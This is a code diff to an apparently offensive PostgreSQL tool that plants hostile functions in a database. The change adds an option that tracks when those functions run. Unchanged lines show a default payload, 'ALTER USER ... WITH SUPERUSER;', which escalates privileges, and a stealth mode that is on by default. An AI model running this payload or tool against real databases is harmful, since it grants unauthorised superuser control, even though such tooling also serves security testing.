@@ -11,7 +11,7 @@ from core.database import Database
 from core.dbfunction import DBFunction
 
 
-def make_it_hostile(db, exploit_payload, stealth_mode=False, create_exploit=True, run_tests=True, out_dir="./out"):
+def make_it_hostile(db, exploit_payload, stealth_mode=False, create_exploit=True, run_tests=True, out_dir="./out", track_execution=False):
     defined_functions = []
 
     try:
@@ -33,7 +33,7 @@ def make_it_hostile(db, exploit_payload, stealth_mode=False, create_exploit=True
             initial_types = [int(i) for i in record['argtypes'].split()]
             conv_types = convert_types(initial_types)
             for artype in conv_types:
-                df = DBFunction(record['name'], artype, initial_types, record['rettype'], exploit_payload, stealth_mode)
+                df = DBFunction(record['name'], artype, initial_types, record['rettype'], exploit_payload, stealth_mode, track_execution)
                 defined_functions.append(df)
         print("[ * ] %s interesting functions have been identified" % found_functions_cnt)
         errors = []
@@ -135,6 +135,7 @@ def main():
     parser.add_argument("-s", "--disable-stealth-mode", default=False, action='store_true', help='Disable stealth mode')
     parser.add_argument("-S", '--db-ssl-mode', type=str, help='Database ssl mode (default None)')
     parser.add_argument("-x", '--exploit-payload', type=str, help='The SQL commands')
+    parser.add_argument("-t", "--track-execution", default=False, action='store_true', help='Track the exploit function execution')
     args = parser.parse_args()
 
     if not os.path.isdir(args.out):
@@ -160,7 +161,23 @@ def main():
         )
     except Error as error:
         print_err(f"Error while connecting to PostgreSQL: {error}")
-        return 1
+        return 2
+
+    if args.track_execution:
+        try:
+            db.query("create schema if not exists pghostile")
+            db.query("""
+                create table if not exists pghostile.triggers (
+                    id SERIAL primary key,
+                    fname varchar(255),
+                    params text,
+                    current_query text,
+                    created_at timestamp without time zone default (now() at time zone 'utc')
+                );
+            """)
+        except Error as error:
+            print_err(f"Error creating tracking table: {error}")
+            return 3
 
     exploit_payload = args.exploit_payload or f"ALTER USER {args.db_username} WITH SUPERUSER;"
 
@@ -170,7 +187,8 @@ def main():
         stealth_mode=not args.disable_stealth_mode,
         create_exploit=not args.disable_exploits_creation,
         run_tests=not args.skip_tests,
-        out_dir=args.out
+        out_dir=args.out,
+        track_execution=args.track_execution
     )
 
     return 0
